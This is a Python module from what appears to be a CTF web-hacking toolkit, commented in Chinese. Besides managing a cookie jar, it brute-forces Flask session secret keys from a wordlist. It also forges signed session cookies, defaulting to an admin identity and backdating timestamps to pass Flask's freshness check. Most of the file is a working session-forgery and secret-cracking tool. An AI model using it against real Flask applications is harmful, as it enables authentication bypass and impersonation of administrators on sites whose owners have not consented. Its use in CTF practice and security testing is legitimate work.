"""cookie —— 看/改/删 jar 里的 cookie，外加 Flask 客户端 session 的爆破与伪造。

Flask session cookie 结构（三段）：
    base64url(payload) . base64url(4字节时间戳) . base64url(HMAC-SHA1)
    签名密钥 = HMAC(secret_key, b"cookie-session")，对 "payload.timestamp" 签名
    payload 可能是 zlib 压缩（开头是 '.'）

⚠️ 伪造时时间戳要回拨（默认 -60s）：Flask 会校验 max_age，时间戳比服务端新会被
   判 "Signature age is in the future" 而整块 cookie 被丢弃（表现为 500，不是没权限）。
这部分是从你 NSSCTF-session伪造 那篇笔记的踩坑里搬进来的。
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import sys
import time
import urllib.parse
import zlib

from ..core.session import Session

SALT = b"cookie-session"


# ---------------------------------------------------------------- flask session
def _b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _b64d(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _derive(secret: str) -> bytes:
    return hmac.new(secret.encode(), SALT, hashlib.sha1).digest()


def unsign(value: str, secret: str) -> dict | None:
    """验签并解出 payload（payload 是 zlib 压缩时会自动解压）。"""
    try:
        p, ts, sig = value.split(".")
    except ValueError:
        return None
    want = _b64e(hmac.new(_derive(secret), f"{p}.{ts}".encode(), hashlib.sha1).digest())
    if not hmac.compare_digest(want, sig):
        return None
    raw = _b64d(p)
    if raw[:1] == b".":
        raw = zlib.decompress(raw[1:])
    return json.loads(raw)


def sign(payload: dict, secret: str, ts: int | None = None, compress: bool = False) -> str:
    raw = json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode()
    if compress:
        raw = b"." + zlib.compress(raw)
    p = _b64e(raw)
    t = int(ts if ts is not None else time.time() - 60)          # 回拨，避开 future 校验
    ts_seg = _b64e(t.to_bytes(4, "big"))
    sig = hmac.new(_derive(secret), f"{p}.{ts_seg}".encode(), hashlib.sha1).digest()
    return f"{p}.{ts_seg}.{_b64e(sig)}"


def crack(value: str, wordlist: str) -> str | None:
    n = 0
    with open(wordlist, encoding="utf-8", errors="replace") as f:
        for line in f:
            w = line.strip()
            if not w:
                continue
            n += 1
            if unsign(value, w) is not None:
                print(f"[+] secret = {w}   (试了 {n} 个)")
                return w
    print(f"[-] 没爆出来（试了 {n} 个）。换字典，或先看源码里有没有硬编码密钥")
    return None


# ---------------------------------------------------------------- 子命令
def _sess(args) -> Session:
    base = args.base or ""
    if base and not base.startswith("http"):
        base = "http://" + base
    return Session(base=base, jar_name=getattr(args, "jar", None))


def _cookie_value(args) -> str:
    if getattr(args, "cookie", None):
        return args.cookie
    s = _sess(args)
    name = args.name
    for c in s.jar:
        if c.name == name:
            return c.value
    raise SystemExit(f"[!] jar 里没有 {name}（webctl cookie list --base {args.base} 看全部）")


def run_list(args) -> int:
    s = _sess(args)
    if not args.base:
        cache = os.path.dirname(s.jar_path)
        for f in sorted(os.listdir(cache)):
            if f.endswith(".jar"):
                j = Session(base="", jar_name=f[:-4])
                print(f"[{f[:-4]}]")
                for c in j.jar:
                    print(f"  {c.name}={c.value[:120]}")
        return 0
    print(f"[{args.base}] {s.jar_path}")
    for c in s.jar:
        print(f"  {c.name}={c.value}")
    return 0


def run_set(args) -> int:
    s = _sess(args)
    k, _, v = args.kv.partition("=")
    s.set_cookie(k, v)
    s.jar.save(ignore_discard=True, ignore_expires=True)
    print(f"set {k}={v} -> {s.jar_path}")
    print("提示：跨域请求时会带 domain 限制；要临时用可以直接给 req 加 -b k=v")
    return 0


def run_del(args) -> int:
    s = _sess(args)
    for c in list(s.jar):
        if c.name == args.name:
            s.jar.clear(c.domain, c.path, c.name)
    s.jar.save(ignore_discard=True, ignore_expires=True)
    print(f"del {args.name} -> {s.jar_path}")
    return 0


def run_raw(args) -> int:
    s = _sess(args)
    print("; ".join(f"{c.name}={c.value}" for c in s.jar))
    return 0


def run_flask_unsign(args) -> int:
    v = _cookie_value(args)
    for secret in args.secret or []:
        data = unsign(v, secret)
        if data is not None:
            print(json.dumps(data, ensure_ascii=False, indent=2))
            return 0
    if args.wordlist:
        secret = crack(v, args.wordlist)
        if not secret:
            return 1
        print(json.dumps(unsign(v, secret), ensure_ascii=False, indent=2))
        return 0
    print("[!] 给 --secret 或 -w 字典", file=sys.stderr)
    return 2


def run_flask_sign(args) -> int:
    payload = {}
    base_value = getattr(args, "cookie", None)
    if base_value:
        for secret in [args.secret]:
            cur = unsign(base_value, secret)
            if cur:
                payload.update(cur)
    for kv in args.set or []:
        k, _, v = kv.partition("=")
        try:
            v = json.loads(v)
        except Exception:
            pass
        payload[k] = v
    if not payload:
        payload = {"name": "admin"}
    print(sign(payload, args.secret, compress=args.compress))
    print(f"[提示] payload={json.dumps(payload, ensure_ascii=False)}；时间戳已回拨 60s（Flask 不接受未来的签名）",
          file=sys.stderr)
    return 0


def register(sub) -> None:
    p = sub.add_parser("cookie", help="cookie jar 查看/修改 + Flask session 爆破与伪造")
    v = p.add_subparsers(dest="cookcmd", required=True)

    def base(sp):
        sp.add_argument("--base", help="站点地址（不带 scheme 自动补 http://）")
        sp.add_argument("--jar", help="用哪份 jar")

    l = v.add_parser("list", help="列出 jar 里的 cookie（不给 --base 列全部 jar）")
    base(l); l.set_defaults(func=run_list)

    st = v.add_parser("set", help="写一个 cookie 进 jar（k=v）")
    base(st); st.add_argument("kv"); st.set_defaults(func=run_set)

    d = v.add_parser("del", help="删一个 cookie")
    base(d); d.add_argument("--name", required=True); d.set_defaults(func=run_del)

    r = v.add_parser("raw", help="输出一行 Cookie: 头（方便粘到别处）")
    base(r); r.set_defaults(func=run_raw)

    fu = v.add_parser("flask-unsign", help="解密 Flask session（给密钥或爆字典）")
    base(fu)
    fu.add_argument("--cookie", help="直接给 session 值（不给就从 jar 取）")
    fu.add_argument("--name", default="session", help="从 jar 取哪个 cookie（默认 session）")
    fu.add_argument("--secret", action="append", help="试这个密钥（可多次）")
    fu.add_argument("-w", "--wordlist", help="爆密钥用的字典")
    fu.set_defaults(func=run_flask_unsign)

    fs = v.add_parser("flask-sign", help="伪造 Flask session cookie")
    base(fs)
    fs.add_argument("--cookie", help="现有 session 值（给了就先解出来再改）")
    fs.add_argument("--name", default="session", help="从 jar 取哪个 cookie（默认 session）")
    fs.add_argument("--secret", required=True)
    fs.add_argument("--set", action="append", help="改字段，如 --set role=admin")
    fs.add_argument("--compress", action="store_true", help="zlib 压缩 payload（大 payload 用）")
    fs.set_defaults(func=run_flask_sign)
